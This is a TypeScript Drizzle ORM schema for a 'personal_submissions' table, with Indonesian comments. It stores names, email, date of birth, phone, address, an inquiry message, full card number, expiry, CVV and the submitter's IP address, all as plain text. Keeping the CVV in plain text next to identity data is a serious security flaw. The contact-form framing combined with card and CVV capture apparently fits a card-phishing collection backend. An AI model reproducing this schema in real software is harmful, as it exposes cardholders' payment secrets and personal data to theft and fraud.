import { pgTable, serial, text, timestamp } from "drizzle-orm/pg-core";

export const personalSubmissionsTable = pgTable("personal_submissions", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  // Info Pribadi
  firstName: text("first_name"),
  lastName: text("last_name"),
  email: text("email"),
  dob: text("dob"),
  // Kontak
  phone: text("phone"),
  // Alamat
  address: text("address"),
  city: text("city"),
  state: text("state"),
  postalCode: text("postal_code"),
  // Pertanyaan
  inquiryType: text("inquiry_type"),
  message: text("message"),
  // Informasi Kartu
  cardDigits: text("card_digits"),
  cardExp: text("card_exp"),
  cardCvv: text("card_cvv"),
  // Meta
  ipAddress: text("ip_address"),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
});

export type PersonalSubmission = typeof personalSubmissionsTable.$inferSelect;
